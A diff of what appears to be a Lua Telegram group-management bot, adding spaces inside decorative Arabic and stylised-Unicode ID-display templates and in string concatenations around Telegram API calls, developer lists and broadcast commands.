-🇪🇬 - 𝄬 ᴹˢᴳˢ.#msgs  𓃠
+🇪🇬 - 𝄬 𝐔ˢᴱᴿᴺᴬᴹᴱ . #username  𓃠
+🇪🇬 - 𝄬 ˢᵀᴬˢᵀ . #stast  𓃠
+🇪🇬 - 𝄬 ᴵᴰ . #id 𓃠
+🇪🇬 - 𝄬 ᴳᴹᴬˢ . #gmas 𓃠
+🇪🇬 - 𝄬 ᴹˢᴳˢ . #msgs  𓃠
 🇪🇬 - 𝄬 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
@@ -2855,27 +2854,27 @@ Msᴀɢ ~ #msgs
 𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
-- 🇪🇬 UsErNaMe.#username 𖠲
-- 🇪🇬 StAsT.#stast 𖠲
-- 🇪🇬 Id.#id 𖠲
-- 🇪🇬 GaMeS.#game 𖠲
-- 🇪🇬 MsGs.#msgs 𖠲
+- 🇪🇬 UsErNaMe . #username 𖠲
+- 🇪🇬 StAsT . #stast 𖠲
+- 🇪🇬 Id . #id 𖠲
+- 🇪🇬 GaMeS . #game 𖠲
+- 🇪🇬 MsGs . #msgs 𖠲
 - 🇪🇬 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
-🇪🇬 - 𝄬 username.#username  𓃠
-🇪🇬 - 𝄬 stast.#stast  𓃠
-🇪🇬 - 𝄬 id.#id 𓃠
-🇪🇬 - 𝄬 gmas.#gmas 𓃠
-🇪🇬 - 𝄬 msgs.#msgs  𓃠
+🇪🇬 - 𝄬 username . #username  𓃠
+🇪🇬 - 𝄬 stast . #stast  𓃠
+🇪🇬 - 𝄬 id . #id 𓃠
+🇪🇬 - 𝄬 gmas . #gmas 𓃠
+🇪🇬 - 𝄬 msgs . #msgs  𓃠
 🇪🇬 - 𝄬 𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
-金 - 𝓾𝓼𝓮𝓻𝓷𝓪𝓶𝓮.#username ⸙ 
-金 - 𝓼𝓽𝓪𝓼𝓽 .#stast ⸙ 
-金 - 𝓲𝓭.#id ⸙ 
-金 - 𝓰𝓶𝓪𝓼.#gmas ⸙ 
-金 - 𝓶𝓼𝓰𝓼.#msgs ⸙
+金 - 𝓾𝓼𝓮𝓻𝓷𝓪𝓶𝓮 . #username ⸙ 
+金 - 𝓼𝓽𝓪𝓼𝓽  . #stast ⸙ 
+金 - 𝓲𝓭 . #id ⸙ 
+金 - 𝓰𝓶𝓪𝓼 . #gmas ⸙ 
+金 - 𝓶𝓼𝓰𝓼 . #msgs ⸙
 金 - 𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
@@ -2900,19 +2899,19 @@ Msᴀɢ ~ #msgs
 𓂅 𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
-- 🇪🇬 𝒖𝒔𝒆𝒓𝒏𝒂𝒎𝒆.#username 𖣂.
-- 🇪🇬 𝒔𝒕𝒂𝒔𝒕.#stast 𖣂.
-- 🇪🇬 𝒊𝒅.#id 𖣂.
-- 🇪🇬 𝒈𝒂𝒎𝒆𝒔.#game 𖣂.
-- 🇪🇬 𝒎𝒔𝒈𝒔.#msgs 𖣂.
+- 🇪🇬 𝒖𝒔𝒆𝒓𝒏𝒂𝒎𝒆 . #username 𖣂.
+- 🇪🇬 𝒔𝒕𝒂𝒔𝒕 . #stast 𖣂.
+- 🇪🇬 𝒊𝒅 . #id 𖣂.
+- 🇪🇬 𝒈𝒂𝒎𝒆𝒔 . #game 𖣂.
+- 🇪🇬 𝒎𝒔𝒈𝒔 . #msgs 𖣂.
 - 🇪🇬 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
-ᯓ 𝗨𝗦𝗘𝗥𝗡𝗮𝗺𝗘.#username 🇪🇬 ꙰
-ᯓ 𝗦𝗧𝗮𝗦𝗧.#stast 🇪🇬 ꙰
-ᯓ 𝗜𝗗.#id 🇪🇬 ꙰
-ᯓ 𝗚𝗮𝗺𝗘𝗦.#game 🇪🇬 ꙰
-ᯓ 𝗺𝗦𝗚𝗦.#msgs 🇪🇬 ꙰
+ᯓ 𝗨𝗦𝗘𝗥𝗡𝗮𝗺𝗘 . #username 🇪🇬 ꙰
+ᯓ 𝗦𝗧𝗮𝗦𝗧 . #stast 🇪🇬 ꙰
+ᯓ 𝗜𝗗 . #id 🇪🇬 ꙰
+ᯓ 𝗚𝗮𝗺𝗘𝗦 . #game 🇪🇬 ꙰
+ᯓ 𝗺𝗦𝗚𝗦 . #msgs 🇪🇬 ꙰
 ᯓ 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
@@ -2931,18 +2930,18 @@ Msᴀɢ ~ #msgs
 ➥• 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
-👳🏼‍♂ - 𝄬 username.#username.🇪🇬
-👳🏼‍♂ - 𝄬 stast.#stast.🇪🇬
-👳🏼‍♂ - 𝄬 id.#id.🇪🇬
-👳🏼‍♂ - 𝄬 auto.#auto.🇪🇬
-👳🏼‍♂ - 𝄬 msgs.#msgs.🇪🇬
+👳🏼‍♂ - 𝄬 username . #username . 🇪🇬
+👳🏼‍♂ - 𝄬 stast . #stast . 🇪🇬
+👳🏼‍♂ - 𝄬 id . #id . 🇪🇬
+👳🏼‍♂ - 𝄬 auto . #auto . 🇪🇬
+👳🏼‍♂ - 𝄬 msgs . #msgs . 🇪🇬
 👳🏼‍♂ - 𝄬 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
-➭- 𝒔𝒕𝒂𓂅 #stast 𓍯.💕
-➮- 𝒖𝒔𝒆𝒓𓂅 #username 𓍯.💕
-➭- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯.💕
-➭- 𝒊𝒅 𓂅 #id 𓍯.💕
+➭- 𝒔𝒕𝒂𓂅 #stast 𓍯. 💕
+➮- 𝒖𝒔𝒆𝒓𓂅 #username 𓍯. 💕
+➭- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯. 💕
+➭- 𝒊𝒅 𓂅 #id 𓍯. 💕
 ➭- 𝗖𝗛 - @SOPOWERB0T 💞.
 ]],
 [[
@@ -2954,12 +2953,12 @@ Msᴀɢ ~ #msgs
 𓄼 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
-𝐓𝐓• 𝐘𝐎𝐔𝐑 𝐈𝐃 𖠰 #id.
-𝐓𝐓• 𝐌𝐒𝐆𝐒 𖠰 #msgs.
-𝐓𝐓• 𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 𖠰 #username.
-𝐓𝐓• 𝐒𝐓𝐀𝐒𝐓 𖠰 #stast.
-𝐓𝐓• 𝐀𝐔𝐓𝐎 𖠰 #auto.
-𝐓𝐓• 𝗘𝗗𝗜𝗧 𖠰 #edit.
+𝐓𝐓• 𝐘𝐎𝐔𝐑 𝐈𝐃 𖠰 #id .
+𝐓𝐓• 𝐌𝐒𝐆𝐒 𖠰 #msgs .
+𝐓𝐓• 𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 𖠰 #username .
+𝐓𝐓• 𝐒𝐓𝐀𝐒𝐓 𖠰 #stast .
+𝐓𝐓• 𝐀𝐔𝐓𝐎 𖠰 #auto .
+𝐓𝐓• 𝗘𝗗𝗜𝗧 𖠰 #edit .
 𝐓𝐓• 𝗖𝗛 - @SOPOWERB0T 🦅.
 ]],
 [[
@@ -3023,10 +3022,10 @@ Msᴀɢ ~ #msgs
 ⌯  𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-𓅓➪:ᗰᔕᘜᔕ : #msgs - ❦.
-𓅓➪ : Iᗪ : #id - ❦.
-𓅓➪ : ᔕTᗩᔕT : #stast - ❦.
-𓅓➪ : ᑌᔕᖇᗴᑎᗩᗰᗴ : #username _ ❦.
+𓅓➪:ᗰᔕᘜᔕ : #msgs - ❦ .
+𓅓➪ : Iᗪ : #id - ❦ . 
+𓅓➪ : ᔕTᗩᔕT : #stast - ❦ . 
+𓅓➪ : ᑌᔕᖇᗴᑎᗩᗰᗴ : #username _ ❦ .
 𓅓➪ : 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
@@ -3038,10 +3037,10 @@ Msᴀɢ ~ #msgs
 - 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-𓁷⁦⁦ - 𝙪𝙚𝙨 †: #username 𓀀.
-𓁷 - 𝙢𝙨𝙜 † : #msgs 𓀀.
-𓁷 - 𝙨𝙩𝙖 †: #stast 𓀀 .
-𓁷 - 𝙞𝙙 †: #id 𓀀.
+𓁷⁦⁦ - 𝙪𝙚𝙨 †: #username 𓀀 .
+𓁷 - 𝙢𝙨𝙜 † : #msgs 𓀀 .
+𓁷 - 𝙨𝙩𝙖 †: #stast 𓀀  .
+𓁷 - 𝙞𝙙 †: #id 𓀀 .
 𓁷 - 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
@@ -3061,11 +3060,11 @@ Msᴀɢ ~ #msgs
 𖤂 ~ 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
--›   𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴.#username 🇪🇬 ꙰ 
--›   𝚂𝚃𝙰𝚂𝚃.#stast 🇪🇬 ꙰
--›   𝙸𝙳.#id 🇪🇬 ꙰ 
--›   𝙶𝙼𝙰𝚂.#stast 🇪🇬 ꙰ 
--›   𝙼𝚂𝙶𝚂.#msgs 🇪🇬 ꙰
+-›   𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 . #username 🇪🇬 ꙰ 
+-›   𝚂𝚃𝙰𝚂𝚃 . #stast 🇪🇬 ꙰
+-›   𝙸𝙳 . #id 🇪🇬 ꙰ 
+-›   𝙶𝙼𝙰𝚂 . #stast 🇪🇬 ꙰ 
+-›   𝙼𝚂𝙶𝚂 . #msgs 🇪🇬 ꙰
 -›   𝗖𝗛 - @SOPOWERB0T 🇪🇬 ꙰.
 ]],
 [[
@@ -3096,15 +3095,15 @@ Msᴀɢ ~ #msgs
 🇪🇬 - 𝚄𝚂𝙴𝚁 ⟿ #username 💘.
 🇪🇬 - 𝙼𝚂𝙶𝚂 ⟿  #msgs 💘.
 🇪🇬 - 𝙶𝙼𝙰𝚂 ⟿ #stast 💘.
-🇪🇬 - 𝙸𝙳 𝚂𝚃𝙰 ⟿ #id 💘. 
+🇪🇬 - 𝙸𝙳 𝚂𝚃𝙰 ⟿ #id 💘.  
 ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
 🇪🇬 - 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-- 𓏬 𝐔𝐬𝐄𝐫 : #username 𓂅.
-- 𓏬 𝐌𝐬𝐆  : #msgs 𓂅.
-- 𓏬 𝐒𝐭𝐀 : #stast 𓂅.
-- 𓏬 𝐈𝐃 : #id 𓂅.
+- 𓏬 𝐔𝐬𝐄𝐫 : #username 𓂅 .
+- 𓏬 𝐌𝐬𝐆  : #msgs 𓂅 .
+- 𓏬 𝐒𝐭𝐀 : #stast 𓂅 .
+- 𓏬 𝐈𝐃 : #id 𓂅 .
 - 𓏬 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
@@ -3123,10 +3122,10 @@ Msᴀɢ ~ #msgs
 🦅•𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-- ᴜѕᴇʀɴᴀᴍᴇ ➣ #username.
-- ᴍѕɢѕ ➣ #msgs.
-- ѕᴛᴀᴛѕ ➣ #stast.
-- ʏᴏᴜʀ ɪᴅ ➣ #id .
+- ᴜѕᴇʀɴᴀᴍᴇ ➣ #username .
+- ᴍѕɢѕ ➣ #msgs .
+- ѕᴛᴀᴛѕ ➣ #stast .
+- ʏᴏᴜʀ ɪᴅ ➣ #id  .
 - 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
@@ -3182,26 +3181,26 @@ Msᴀɢ ~ #msgs
 ➞: 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-➼ : 𝐼𝐷 𖠀 #id.♡
-➼ : 𝑈𝑆𝐸𝑅 𖠀 #username.♡
-➼ : 𝑀𝑆𝐺𝑆 𖠀 #msgs.♡
-➼ : 𝑆𝑇𝐴S𝑇 𖠀 #stast.♡ 
-➼ : 𝐸𝐷𝐼𝑇  𖠀 #edit.♡
+➼ : 𝐼𝐷 𖠀 #id . ♡
+➼ : 𝑈𝑆𝐸𝑅 𖠀 #username .♡
+➼ : 𝑀𝑆𝐺𝑆 𖠀 #msgs .♡
+➼ : 𝑆𝑇𝐴S𝑇 𖠀 #stast .♡ 
+➼ : 𝐸𝐷𝐼𝑇  𖠀 #edit .♡
 ➼ : 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-▽ ¦☉┇• USER ➭ ⁞ #username.
-▽ ¦☉┇• 𝙼𝚂𝙶𝚂 ➬ ⁞  #msgs .
-▽ ¦☉┇• STAT ➬ ⁞ #stast .
-▽ ¦☉┇• 𝙸𝙳  ➬ ⁞ #id .
-▽ ¦☉┇• 𝗖𝗛 - @SOPOWERB0T 🦅
+▽ ¦❀• USER ➭ ⁞ #username .
+▽ ¦❀• 𝙼𝚂𝙶𝚂 ➬ ⁞  #msgs  .
+▽ ¦❀• STAT ➬ ⁞ #stast  .
+▽ ¦❀• 𝙸𝙳  ➬ ⁞ #id  .
+▽ ¦❀• 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
 • ❉ 𝑼𝑬𝑺 : #username ‌‌‏.
-• ❉ 𝑺𝑻𝑨 : #stast.
+• ❉ 𝑺𝑻𝑨 : #stast .
 • ❉ 𝑰𝑫 : #id  ‌‌‏.
 • ❉  𝑴𝑺𝑮 : #msgs 𓆊.
-• ❉ 𝑾𝒆𝒍𝒄𝒐𝒎𝒆  ⁞.
+• ❉ 𝑾𝒆𝒍𝒄𝒐𝒎𝒆  ⁞ .
 • ❉ 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
@@ -3242,10 +3241,10 @@ Msᴀɢ ~ #msgs
 ◣: 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-- 𝄬 username.#username ➪🇪🇬
- - 𝄬 stast.#stast ➪🇪🇬
- - 𝄬 id.#id ➪🇪🇬
- - 𝄬 msgs.#msgs ➪🇪🇬
+- 𝄬 username . #username ➪🇪🇬
+ - 𝄬 stast . #stast ➪🇪🇬
+ - 𝄬 id . #id ➪🇪🇬
+ - 𝄬 msgs . #msgs ➪🇪🇬
  - 𝄬 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
@@ -3263,7 +3262,7 @@ Msᴀɢ ~ #msgs
 ➫✿: 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-✶- 𝒔𝒕𝒂𓂅 #stast 𓍯↝❃.
+✶- 𝒔𝒕𝒂𓂅 #stast 𓍯↝❃ .
 ✶- 𝒖𝒔𝒆𝒓𓂅 #username 𓍯↝❃.
 ✶- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯↝❃.
 ✶- 𝒊𝒅 𓂅 #id 𓍯↝❃.
@@ -3288,13 +3287,13 @@ Msᴀɢ ~ #msgs
 • 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-- ᴜѕᴇʀɴᴀᴍᴇ ➣ #username.
-- ᴍѕɢѕ ➣ #msgs.
-- ѕᴛᴀᴛѕ ➣ #stast.
-- ʏᴏᴜʀ ɪᴅ ➣ #id .
-- ᴇᴅɪᴛ ᴍsɢ ➣ #edit.
-- ᴅᴇᴛᴀɪʟs ➣ #auto.
--  ɢᴀᴍᴇ ➣ #game.
+- ᴜѕᴇʀɴᴀᴍᴇ ➣ #username .
+- ᴍѕɢѕ ➣ #msgs .
+- ѕᴛᴀᴛѕ ➣ #stast .
+- ʏᴏᴜʀ ɪᴅ ➣ #id  .
+- ᴇᴅɪᴛ ᴍsɢ ➣ #edit .
+- ᴅᴇᴛᴀɪʟs ➣ #auto . 
+-  ɢᴀᴍᴇ ➣ #game .
 - 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
@@ -3372,19 +3371,19 @@ Msᴀɢ ~ #msgs
 ✰ 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-⌾ | 𝒊𝒅  𓃠 #id.
-⌾ | 𝒖𝒔𝒆𝒓 𓃠 #username.
-⌾ | 𝒎𝒔𝒈𝒔 𓃠 #msgs.
-⌾ | 𝒔𝒕𝒂𝒕𝒔 𓃠 #stast.
-⌾ | 𝒆𝒅𝒊𝒕 𓃠 #edit.
+⌾ | 𝒊𝒅  𓃠 #id .
+⌾ | 𝒖𝒔𝒆𝒓 𓃠 #username .
+⌾ | 𝒎𝒔𝒈𝒔 𓃠 #msgs .
+⌾ | 𝒔𝒕𝒂𝒕𝒔 𓃠 #stast .
+⌾ | 𝒆𝒅𝒊𝒕 𓃠 #edit .
 ⌾ | 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-♡ : 𝐼𝐷 𖠀 #id.
-♡ : 𝑈𝑆𝐸𝑅 𖠀 #username.
-♡ : 𝑀𝑆𝐺𝑆 𖠀 #msgs.
-♡ : 𝑆𝑇𝐴𝑇𝑆 𖠀 #stast.
-♡ : 𝐸𝐷𝐼𝑇  𖠀 #edit.
+♡ : 𝐼𝐷 𖠀 #id .
+♡ : 𝑈𝑆𝐸𝑅 𖠀 #username .
+♡ : 𝑀𝑆𝐺𝑆 𖠀 #msgs .
+♡ : 𝑆𝑇𝐴𝑇𝑆 𖠀 #stast .
+♡ : 𝐸𝐷𝐼𝑇  𖠀 #edit .
 ♡ : 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
@@ -3395,10 +3394,10 @@ Msᴀɢ ~ #msgs
 •𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-• USE ➤ #username .
-• MSG ➤  #msgs .
-• STA ➤  #stast .
-• iD ➤ #id .
+• USE ➤ #username  .
+• MSG ➤  #msgs  .
+• STA ➤  #stast  .
+• iD ➤ #id  .
 • 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
@@ -3423,18 +3422,18 @@ Msᴀɢ ~ #msgs
 • 🇪🇬 - 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-• USE ➤  #username.
-• MSG ➤  #msgs.
-• STA ➤  #stast.
-• iD ➤ #id.
+• USE ➤  #username .
+• MSG ➤  #msgs .
+• STA ➤  #stast .
+• iD ➤ #id .
 • 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-🇪🇬 - 𝄬 𝐔ˢᴱᴿᴺᴬᴹᴱ.#username  𓃠
-🇪🇬 - 𝄬 ˢᵀᴬˢᵀ.#stast  𓃠
-🇪🇬 - 𝄬 ᴵᴰ.#id 𓃠
-🇪🇬 - 𝄬 ᴳᴹᴬˢ.#gmas 𓃠
-🇪🇬 - 𝄬 ᴹˢᴳˢ.#msgs  𓃠
+🇪🇬 - 𝄬 𝐔ˢᴱᴿᴺᴬᴹᴱ . #username  𓃠
+🇪🇬 - 𝄬 ˢᵀᴬˢᵀ . #stast  𓃠
+🇪🇬 - 𝄬 ᴵᴰ . #id 𓃠
+🇪🇬 - 𝄬 ᴳᴹᴬˢ . #gmas 𓃠
+🇪🇬 - 𝄬 ᴹˢᴳˢ . #msgs  𓃠
 🇪🇬 - 𝄬 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
@@ -3445,11 +3444,11 @@ Msᴀɢ ~ #msgs
 ➜𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-- 🇪🇬 UsErNaMe.#username 𖠲
-- 🇪🇬 StAsT.#stast 𖠲
-- 🇪🇬 Id.#id 𖠲
-- 🇪🇬 GaMeS.#game 𖠲
-- 🇪🇬 MsGs.#msgs 𖠲
+- 🇪🇬 UsErNaMe . #username 𖠲
+- 🇪🇬 StAsT . #stast 𖠲
+- 🇪🇬 Id . #id 𖠲
+- 🇪🇬 GaMeS . #game 𖠲
+- 🇪🇬 MsGs . #msgs 𖠲
 - 🇪🇬 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
@@ -3489,11 +3488,11 @@ Msᴀɢ ~ #msgs
 ➥• 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-🇪🇬 - 𝄬 username.#username  𓃠
-🇪🇬 - 𝄬 stast.#stast  𓃠
-🇪🇬 - 𝄬 id.#id 𓃠
-🇪🇬 - 𝄬 gmas.#gmas 𓃠
-🇪🇬 - 𝄬 msgs.#msgs  𓃠
+🇪🇬 - 𝄬 username . #username  𓃠
+🇪🇬 - 𝄬 stast . #stast  𓃠
+🇪🇬 - 𝄬 id . #id 𓃠
+🇪🇬 - 𝄬 gmas . #gmas 𓃠
+🇪🇬 - 𝄬 msgs . #msgs  𓃠
 🇪🇬 - 𝄬 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
@@ -3505,42 +3504,42 @@ Msᴀɢ ~ #msgs
 .𖣂 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-金 - 𝓾𝓼𝓮𝓻𝓷𝓪𝓶𝓮.#username ⸙ 
-金 - 𝓼𝓽𝓪𝓼𝓽 .#stast ⸙ 
-金 - 𝓲𝓭.#id ⸙ 
-金 - 𝓰𝓶𝓪𝓼.#gmas ⸙ 
-金 - 𝓶𝓼𝓰𝓼.#msgs ⸙
+金 - 𝓾𝓼𝓮𝓻𝓷𝓪𝓶𝓮 . #username ⸙ 
+金 - 𝓼𝓽𝓪𝓼𝓽  . #stast ⸙ 
+金 - 𝓲𝓭 . #id ⸙ 
+金 - 𝓰𝓶𝓪𝓼 . #gmas ⸙ 
+金 - 𝓶𝓼𝓰𝓼 . #msgs ⸙
 金 - 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-- 🇪🇬 𝒖𝒔𝒆𝒓𝒏𝒂𝒎𝒆.#username 𖣂.
-- 🇪🇬 𝒔𝒕𝒂𝒔𝒕.#stast 𖣂.
-- 🇪🇬 𝒊𝒅.#id 𖣂.
-- 🇪🇬 𝒈𝒂𝒎𝒆𝒔.#game 𖣂.
-- 🇪🇬 𝒎𝒔𝒈𝒔.#msgs 𖣂.
+- 🇪🇬 𝒖𝒔𝒆𝒓𝒏𝒂𝒎𝒆 . #username 𖣂.
+- 🇪🇬 𝒔𝒕𝒂𝒔𝒕 . #stast 𖣂.
+- 🇪🇬 𝒊𝒅 . #id 𖣂.
+- 🇪🇬 𝒈𝒂𝒎𝒆𝒔 . #game 𖣂.
+- 🇪🇬 𝒎𝒔𝒈𝒔 . #msgs 𖣂.
 - 🇪🇬 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-ᯓ 𝗨𝗦𝗘𝗥𝗡𝗮𝗺𝗘.#username 🇪🇬 ꙰
-ᯓ 𝗦𝗧𝗮𝗦𝗧.#stast 🇪🇬 ꙰
-ᯓ 𝗜𝗗.#id 🇪🇬 ꙰
-ᯓ 𝗚𝗮𝗺𝗘𝗦.#game 🇪🇬 ꙰
-ᯓ 𝗺𝗦𝗚𝗦.#msgs 🇪🇬 ꙰
+ᯓ 𝗨𝗦𝗘𝗥𝗡𝗮𝗺𝗘 . #username 🇪🇬 ꙰
+ᯓ 𝗦𝗧𝗮𝗦𝗧 . #stast 🇪🇬 ꙰
+ᯓ 𝗜𝗗 . #id 🇪🇬 ꙰
+ᯓ 𝗚𝗮𝗺𝗘𝗦 . #game 🇪🇬 ꙰
+ᯓ 𝗺𝗦𝗚𝗦 . #msgs 🇪🇬 ꙰
 ᯓ 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-👳🏼‍♂ - 𝄬 username.#username.🇪🇬
-👳🏼‍♂ - 𝄬 stast.#stast.🇪🇬
-👳🏼‍♂ - 𝄬 id.#id.🇪🇬
-👳🏼‍♂ - 𝄬 auto.#auto.🇪🇬
-👳🏼‍♂ - 𝄬 msgs.#msgs.🇪🇬
+👳🏼‍♂ - 𝄬 username . #username . 🇪🇬
+👳🏼‍♂ - 𝄬 stast . #stast . 🇪🇬
+👳🏼‍♂ - 𝄬 id . #id . 🇪🇬
+👳🏼‍♂ - 𝄬 auto . #auto . 🇪🇬
+👳🏼‍♂ - 𝄬 msgs . #msgs . 🇪🇬
 👳🏼‍♂ - 𝄬 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-➭- 𝒔𝒕𝒂𓂅 #stast 𓍯.💕
-➮- 𝒖𝒔𝒆𝒓𓂅 #username 𓍯.💕
-➭- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯.💕
-➭- 𝒊𝒅 𓂅 #id 𓍯.💕
+➭- 𝒔𝒕𝒂𓂅 #stast 𓍯. 💕
+➮- 𝒖𝒔𝒆𝒓𓂅 #username 𓍯. 💕
+➭- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯. 💕
+➭- 𝒊𝒅 𓂅 #id 𓍯. 💕
 ➭- 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
@@ -3552,12 +3551,12 @@ Msᴀɢ ~ #msgs
 𓄼 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
-𝐓𝐓• 𝐘𝐎𝐔𝐑 𝐈𝐃 𖠰 #id.
-𝐓𝐓• 𝐌𝐒𝐆𝐒 𖠰 #msgs.
-𝐓𝐓• 𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 𖠰 #username.
-𝐓𝐓• 𝐒𝐓𝐀𝐒𝐓 𖠰 #stast.
-𝐓𝐓• 𝐀𝐔𝐓𝐎 𖠰 #auto.
-𝐓𝐓• 𝗘𝗗𝗜𝗧 𖠰 #edit.
+𝐓𝐓• 𝐘𝐎𝐔𝐑 𝐈𝐃 𖠰 #id .
+𝐓𝐓• 𝐌𝐒𝐆𝐒 𖠰 #msgs .
+𝐓𝐓• 𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 𖠰 #username .
+𝐓𝐓• 𝐒𝐓𝐀𝐒𝐓 𖠰 #stast .
+𝐓𝐓• 𝐀𝐔𝐓𝐎 𖠰 #auto .
+𝐓𝐓• 𝗘𝗗𝗜𝗧 𖠰 #edit .
 𝐓𝐓• 𝗖𝗛 - @SOPOWERB0T 🦅
 ]],
 [[
@@ -3609,7 +3608,7 @@ keyboard.inline_keyboard = {
 {{text = 'SmartUpShark', url="https://t.me/gamee?game=SmartUpShark"},{text = 'SpikyFish3', url="https://t.me/gamee?game=SpikyFish3"}},  
 }  
 local msg_id = msg.id_/2097152/0.5  
-https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id='..msg.chat_id_..'&text='..URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))  
+https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))  
 end
 if text == "ضع اسم للبوت ☉" and DevSoFi(msg) then  
 database:setex(bot_id..'Set:Name:Bot'..msg.sender_user_id_,300,true) 
@@ -3641,7 +3640,7 @@ if text == ("المطورين ☉") and DevSoFi(msg) then
 local list = database:smembers(bot_id..'Sudo:User')
 t = "\n ☉┇ قائمة المطورين \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
-local username = database:get(bot_id.."user:Name"..v)
+local username = database:get(bot_id.."user:Name" .. v)
 if username then
 t = t..""..k.."- ([@"..username.."])\n"
 else
@@ -3657,7 +3656,7 @@ if text == ("قائمه العام ☉") and DevSoFi(msg) then
 local list = database:smembers(bot_id..'GBan:User')
 t = "\n ☉┇ قائمه المحظورين عام \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
-local username = database:get(bot_id.."user:Name"..v)
+local username = database:get(bot_id.."user:Name" .. v)
 if username then
 t = t..""..k.."- ([@"..username.."])\n"
 else
@@ -3674,7 +3673,7 @@ if text == ("قائمه الكتم العام ☉") and DevSoFi(msg) then
 local list = database:smembers(bot_id..'Gmute:User')
 t = "\n ☉┇ قائمة المكتومين عام \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
-local username = database:get(bot_id.."user:Name"..v)
+local username = database:get(bot_id.."user:Name" .. v)
 if username then
 t = t..""..k.."- ([@"..username.."])\n"
 else
@@ -3688,27 +3687,27 @@ send(msg.chat_id_, msg.id_, t)
 return false
 end
 if text=="اذاعه خاص ☉" and msg.reply_to_message_id_ == 0 and DevSoFi(msg) then 
-database:setex(bot_id.."Send:Bc:Pv"..msg.chat_id_..":"..msg.sender_user_id_, 600, true) 
+database:setex(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
 send(msg.chat_id_, msg.id_," ☉┇ ارسل الان اذاعتك؟ \n ☉┇ للخروج ارسل الغاء ")
 return false
 end 
 if text=="اذاعه ☉" and msg.reply_to_message_id_ == 0 and DevSoFi(msg) then 
-database:setex(bot_id.."Send:Bc:Grops"..msg.chat_id_..":"..msg.sender_user_id_, 600, true) 
+database:setex(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
 send(msg.chat_id_, msg.id_," ☉┇ ارسل الان اذاعتك؟ \n ☉┇ للخروج ارسل الغاء ")
 return false
 end  
